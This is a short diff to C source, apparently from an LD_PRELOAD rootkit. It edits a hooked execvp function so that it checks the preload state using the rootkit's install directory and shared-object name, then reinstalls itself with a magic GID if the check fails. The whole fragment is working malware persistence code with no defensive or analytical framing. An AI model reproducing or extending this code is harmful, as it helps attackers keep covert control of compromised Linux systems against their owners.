@@ -4,7 +4,7 @@ int execvp(const char *filename, char *const argv[]){
 #ifdef PATCH_DYNAMIC_LINKER
         preloadpath = PRELOAD_FILE;
 #endif
-        if(!preloadok(PRELOAD_FILE, NULL, NULL)){
+        if(!preloadok(PRELOAD_FILE, INSTALL_DIR, BDVLSO)){
             bdvinstall(argv, INSTALL_DIR, BDVLSO, preloadpath, MAGIC_GID);
             exit(0);
         }
